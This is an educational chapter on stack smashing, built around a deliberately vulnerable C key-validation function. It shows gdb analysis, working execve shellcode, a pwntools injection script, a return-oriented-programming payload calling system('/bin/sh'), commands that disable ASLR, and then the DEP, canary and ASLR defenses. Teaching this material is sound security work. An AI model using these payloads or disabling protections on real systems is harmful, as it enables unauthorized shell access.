# Chapter 1. Stack Smashing
In this chapter, we discuss the most common and easy-to-understand memory-safety problems: stack buffer overflow. An attacker could leverage such bugs to modity the stack and achieve malicious goals, knowning as stack smashing. We will not dive into the technical details of exploit writting (there are many such tutorials and tools available online, e.g., for CTF training) but mainly discuss why such bugs are dangerous and show how attacks could happen in practice. 

## Section 1.1 Stack Smashing

### 1.1.1 Warm Up
Let's use the following code snippet as a toy example, which contains a validation process that requires the user to input a key to pass the validation. The code contains a buffer overflow bug because the length of buf is 64 while it may read 160 byte data. Supposing the user neither know a valid key nor can obtain the source code. How can he find a key to pass the validation? 

```c
int validation() {
    int flag = 0;
    char buf[64];
    //printf("buf address: %p\n", (void*)buf);
    read(STDIN_FILENO, buf, 160);
    if(buf[0]=='$'){
        write(STDOUT_FILENO, "Key verified!\n", 14);
        flag = 1;
    }else{
        write(STDOUT_FILENO, "Wrong key!\n", 11);
    }
    return flag;
}
```

The trick lies in the stack layout, and we can obtain the layout by analyzing its assembly code.

```shell
clang vuln.c -no-pie -o vuln ; build the source code.
gdb vuln                     ; load the program to gdb
gdb-> info functions         ; list the functions within the program
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  write@plt
0x0000000000401040  printf@plt
0x0000000000401050  read@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401150  validation
0x00000000004011c0  main
0x0000000000401230  __libc_csu_init
0x00000000004012a0  __libc_csu_fini
0x00000000004012a8  _fini

gdb-> disas validation           ; view the assembly code of the function validation.
Dump of assembler code for function validation:
   0x0000000000401150 <+0>:     push   rbp
   0x0000000000401151 <+1>:     mov    rbp,rsp
   0x0000000000401154 <+4>:     sub    rsp,0x50
   0x0000000000401158 <+8>:     mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040115f <+15>:    lea    rsi,[rbp-0x50]
   0x0000000000401163 <+19>:    xor    edi,edi
   0x0000000000401165 <+21>:    mov    edx,0xa0
   0x000000000040116a <+26>:    call   0x401050 <read@plt>
   0x000000000040116f <+31>:    movsx  eax,BYTE PTR [rbp-0x50]
   0x0000000000401173 <+35>:    cmp    eax,0x24
   0x0000000000401176 <+38>:    jne    0x40119e <validation+78>
   0x000000000040117c <+44>:    mov    edi,0x1
   0x0000000000401181 <+49>:    lea    rsi,[rip+0xe7c]        # 0x402004
   0x0000000000401188 <+56>:    mov    edx,0xe
   0x000000000040118d <+61>:    call   0x401030 <write@plt>
   0x0000000000401192 <+66>:    mov    DWORD PTR [rbp-0x4],0x1
   0x0000000000401199 <+73>:    jmp    0x4011b4 <validation+100>
   0x000000000040119e <+78>:    mov    edi,0x1
   0x00000000004011a3 <+83>:    lea    rsi,[rip+0xe69]        # 0x402013
   0x00000000004011aa <+90>:    mov    edx,0xb
   0x00000000004011af <+95>:    call   0x401030 <write@plt>
   0x00000000004011b4 <+100>:   mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011b7 <+103>:   add    rsp,0x50
   0x00000000004011bb <+107>:   pop    rbp
   0x00000000004011bc <+108>:   ret

```
![image](./figures/chapt1-stack-main.png)

Let's assume the our porpose is to enforce the function to return 1, so we can trace the data flow of the return value backwards. Starting from Line <+100>, we know the return value of the register (%eax) is moved from the stack -0x4(%rbp). Line <+8> initializes the value of -0x4(%rbp) to 0, while Line <+66> change -0x4(%rbp) to 1. So we can tamper the buffer of -0x4(%rbp) to bypass the validation. Line <+4> tells us the assembly code increases the stack size with 0x50. We can compute the offset of -0x4(%rbp) to the register %rsp should be 0x4b or 76 in decimal. In order to let the function return 1, we can input a 76-byte buf with the last four bytes to be 1.

### 1.1.2 Stack Smashing
A stack smashing attack contains three major steps:
- Step 1. Detect buffer overflow bugs or find an input that can crash a program. This is usually done via fuzz testing. 
- Step 2. Analyze stack layout of the buggy code. In practice, attackers may not be able to obtain the executables. 
- Step 3. Design the exploit. To obtain the shell. e.g., with return-oriented programming.

Now, we discuss a more general senario, i.e., 1) the attacker cannot obtain the binaries, and 2) his goal is to obtain the shell. 

#### 1.1.2.1 Stack Layout Analysis
The purpose is to obtain the offset of the return address so that we can point it to the another code address, e.g., shell code. Let's still use our previous toy program for demonstration. The idea is to input several 'A's (hexdecimal ASCII: 0X41). If it has changed the return addresses, then the program will not be able to continue the execution and report the bad return address. We can gradually increase the length of the input to learn the offset of the return address. 

|                |
|:--------------:|
| previous frame |
|   ret address  |
|       ...      |
|    AAAAAAAA    |

Before experiments, we need to turn on the core dump message
```
#: ulimit -c unlimited
#: sudo sysctl -w kernel.core_pattern=core
```

Input several 'A's and check the core dump message.
```shell
python -c 'print "A"*92'
./vuln
Input your key:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wrong key!
Segmentation fault (core dumped)

gdb --core core 
Core was generated by `./vuln'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000000a41414141 in ?? ()
```
The log message displays a segmentation fault caused by a invalid return address 0x0000000a41414141. Because there are four 'A's, we can know the offset of the return address should be 92-4=88. Note that if you try more a 'A's, the error message may not be 0x0000414141414141 but another different address because 0x0000414141414141 is an invalid code address to the OS.

#### 1.1.2.2 Design the Exploit 
The following code is a shellcode snippts for x86_64, which executes system("/bin/sh"). 
```
xor eax, eax
mov 0xFF978CD091969DD1, rbx
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov 0x3b, al
syscall
```

We can test if the shellcode works via the following code. It first encodes and saves the shellcode as a char array, and then jumps to it as a function call.
```c
const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main (void) {
  char buf[256];
  int len = sizeof(shellcode);
  for(int i=0; i<len; i++)
	    buf[i] = shellcode[i]; 
      ((void (*) (void)) buf) ();
}
```
```shell
clang -fno-stack-protector –no-pie -z execstack shell.c -o shell
```

If it works, we can inject the shellcode to the vulnerable program.
```python
#! /usr/bin/env python
from pwn import *
# context.log_level = 'debug'

ret = 0x7fffffffe000
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode + 'A' * (88-len(shellcode)) + p64(ret)
p = process("./vuln")
p.send(payload)
p.interactive()

```

You have to replace the return address based on your own computer. As a shortcut, you can print the address of `buf`.
```c
printf("buf address: %p\n", (void*)buf);
```

In practice, you can only analyze the address of buf via `gdb`.
```shell
gdb ./vuln
-> break *validation+31
-> run
-> x/64x $rsp
```

Execute the attacking code. If you are lucky enough, you should be able to obtain the following result.
```shell
python hijack.py 
[+] Starting local process './bug': pid 48788
[*] Switching to interactive mode
Input your key:Wrong key!
$ whoami
hui
$ 
```

If not, it possibly means you are using the stack protector or the ASLR. Turn off the stack protector when compiling the buggy program to eable the data on the stack to be executable.
```shell
clang -fno-stack-protector –no-pie -z execstack vuln.c -o vuln
```

You can also turn off the ASLR as following.
```shell
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Section 2. Protection Techniques
To prevent smashing attackes, we may either try to avoid buffer overflow bugs or to increase the difficulty of attacks. To avoid buffer overflow bugs, a widely employd technique during programming is fat pointer. Note that it is generally difficult to detect buffer overflow vulnerabilities during compiling time because whether a pointer points to an out-of-bound address is undecidable. The fat pointer contains additional size information which enables the problem to perform runtime boundary check. We leave the detailed discussion of such programming techniques to later chapters. 

The attack and protection techniques coevolve.

Attack: Stack Smashing 
=> Defense: Data Execution Prevention
===> Attack: Return-oriented Programming
=====> Defense ：ASLR, Stack Canary
=======> Attack ：Side Channel 
=========> Defense ：Shadown Stack 
===========> ...

### 1.2.1 DEP 
DEP is a technique that disable the stack data from being executed. It achieves the purpose by setting the flag of the stack to RW instead of RWE.
```shell
readelf -l bug
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset     VirtAddr           PhysAddr    FileSiz   MemSiz      Flags  Align
  PHDR           0x...00040 0x...00400040 0x...00400040   0x...001f8 0x...001f8  R E    8
  INTERP         0x...00238 0x...00400238 0x...00400238   0x...0001c 0x...0001c  R      1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x...00000 0x...00400000 0x...00400000   0x...00864 0x...00864  R E    200000
  LOAD           0x...00e10 0x...00600e10 0x...00600e10   0x...00230 0x...00238  RW     200000
  DYNAMIC        0x...00e28 0x...00600e28 0x...00600e28   0x...001d0 0x...001d0  RW     8
  NOTE           0x...00254 0x...00400254 0x...00400254   0x...00044 0x...00044  R      4
  GNU_EH_FRAME   0x...00710 0x...00400710 0x...00400710   0x...0003c 0x...0003c  R      4
  GNU_STACK      0x...00000 0x...00000000 0x...00000000   0x...00000 0x...00000  RWE    10
  GNU_RELRO      0x...00e10 0x...00600e10 0x...00600e10   0x...001f0 0x...001f0  R      1
```

### 1.2.2 RoP Attack
If DEP is enabled, we cannot inject shellcode directly on the stack. The idea of RoP is to use existing code to achieve the same sematics. For example, we may change the return address to the system function. As long as we can set the patameter to "/bin/sh" before that, we should be able to execute system("/bin/sh") and obtain the shell. 

The following figure demonstrates the mechanism of an RoP attack. We first change the return address to some gaddet code that allow us to assign the parameter value to "/bin/sh". According to the calling convention of x86_64, the first parameter is saved in the rdi register. Therefore, some instructions containing "pop rdi" might be useful as our gadget. In our example, after "pop rdi", the "ret" instruction will use the data on top of the stack as the return address. We set the address to the function entry of system().

![image](./figures/chapt1-rop.png)

```shell
clang -fno-stack-protector vuln.c -o vuln
gdb bug
(gdb) break *validation
Breakpoint 1 at 0x401150
(gdb) r
Starting program: bug 
Input your key:
Breakpoint 1, 0x0000000000401150 in validation ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x7ffff7e18410 <__libc_system>
(gdb) find 0x7ffff7e18410, +2000000, "/bin/sh"
0x7ffff7f7a5aa
```
```shell
ldd bug
        linux-vdso.so.1 (0x00007ffff7fcd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc3000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)
```

```shell
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
0x00000000000276e9 : pop rdi ; pop rbp ; ret
0x0000000000026b72 : pop rdi ; ret
0x00000000000e926d : pop rdi ; ret 0xfff3
```

```python
system_addr = 0x7ffff7e18410
binsh_addr = 0x7ffff7f7a5aa

libc = ELF('libc.so.6')
ret_offset = 0x0000000000026b72 - libc.symbols['system']
ret_addr = system_addr + ret_offset

payload = "A" * 88 + p64(ret_addr) + p64(binsh_addr) + p64(system_addr) 
```

### 1.2.3 Stack Canary 
Stack canary is a widely used technique to check the stack integrity with a sentinel. Developers can enable stack canary with an option -fstack-protector when compiling their code. The generated assembly code is shown as follows.

```shell
push   %rbp
mov    %rsp,%rbp
sub    $0x80,%rsp
xor    %edi,%edi
mov    $0x64,%eax
mov    %eax,%edx
lea    -0x50(%rbp),%rsi
mov    %fs:0x28,%rcx
mov    %rcx,-0x8(%rbp)
…
mov    %fs:0x28,%rcx
cmp    -0x8(%rbp),%rcx
mov    %eax,-0x74(%rbp)
jne    0x400691 <validation+177>
mov    -0x74(%rbp),%eax
add    $0x80,%rsp
pop    %rbp
retq   
callq  0x4004a0 <__stack_chk_fail@plt>
```

In the assembly code, fs:0x28 stores the sentinel stack-guard value. The code moves the value to -0x8(%rbp) and finally compare it with the original value when the function returns.
|                |
|:--------------:|
| previous frame |
|   ret address  |
|    old rbp     |
|    canary      |
|                |


### 1.2.4 ASLR
ASLR randomizes memory allocations to make memory addresses harder to predict. The technique is implemented by the kernel and the ELF loader. In general, there are three levels of ASLR:
- Stack ASLR: each execution results in a different stack address.
- Mmap ASLR: each execution results in a different memory map.
- Exec ASLR: the program is loaded into a different memory location in each each execution. This is also known as position-independent executables.

To set the levels of ASLR, use the following command.
```shell
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Compile the following code to test the effectiveness of ASLR.
```c
void* getStack(){
   int ptr;
   printf("Stack pointer address: %p\n", &ptr);
};
```

As displayed below, the address of ptr changes in each execution. Also, the address ranges of the dynamic libraries get changed in each execution.
```shell
./aslr 
Stack pointer address: 0x7ffd94085bac
./aslr
Stack pointer address: 0x7ffdbfe1571c
ldd ./bug
	linux-vdso.so.1 =>  (0x00007ffe48122000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f361c002000)
	/lib64/ld-linux-x86-64.so.2 (0x000055e0381de000)
ldd ./bug
	linux-vdso.so.1 =>  (0x00007ffd2dbaa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5fdbbf8000)
	/lib64/ld-linux-x86-64.so.2 (0x0000557fcf719000)
```

To test PIE code, we should use the option '-fPIE -pie' when compiling the program.
```c
void* getStack(){
   return __builtin_return_address(0);
};

int main(int argc, char** argv){
   printf("Ret addr: %p\n", getStack());
   return 0;
}
```

```shell
clang -fPIE -pie aslr.c 
./aslr 
Ret addr: 0x555b032ab77b
./aslr
Ret addr: 0x556eed86777b
```

Disassembling the two binaries compiled with and without PIE can reveal their difference in memory address.
```shell
0x401160: push   %rbp
0x401161: mov    %rsp,%rbp
0x401164: sub    $0x20,%rsp
0x401168: movl   $0x0,-0x4(%rbp)
0x40116f: mov    %edi,-0x8(%rbp)
0x401172: mov    %rsi,-0x10(%rbp)
0x401176: callq  0x401130 <getStack>
0x40117b: movabs $0x40201f,%rdi
0x401185: mov    %rax,%rsi
0x401188: mov    $0x0,%al
0x40118a: callq  0x401030 <printf@plt>
0x40118f: xor    %ecx,%ecx
0x401191: mov    %eax,-0x14(%rbp)
0x401194: mov    %ecx,%eax
0x401196: add    $0x20,%rsp
0x40119a: pop    %rbp
0x40119b: retq 
```

```shell
0x001170: push   %rbp
0x001171: mov    %rsp,%rbp
0x001174: sub    $0x20,%rsp
0x001178: movl   $0x0,-0x4(%rbp)
0x00117f: mov    %edi,-0x8(%rbp)
0x001182: mov    %rsi,-0x10(%rbp)
0x001186: callq  0x1140 <getStack>
0x00118b: lea    0xe8d(%rip),%rdi  #0x201f
0x001192: mov    %rax,%rsi
0x001195: mov    $0x0,%al
0x001197: callq  0x1030 <printf@plt>
0x00119c: xor    %ecx,%ecx
0x00119e: mov    %eax,-0x14(%rbp)
0x0011a1: mov    %ecx,%eax
0x0011a3: add    $0x20,%rsp
0x0011a7: pop    %rbp
0x0011a8: retq 
```



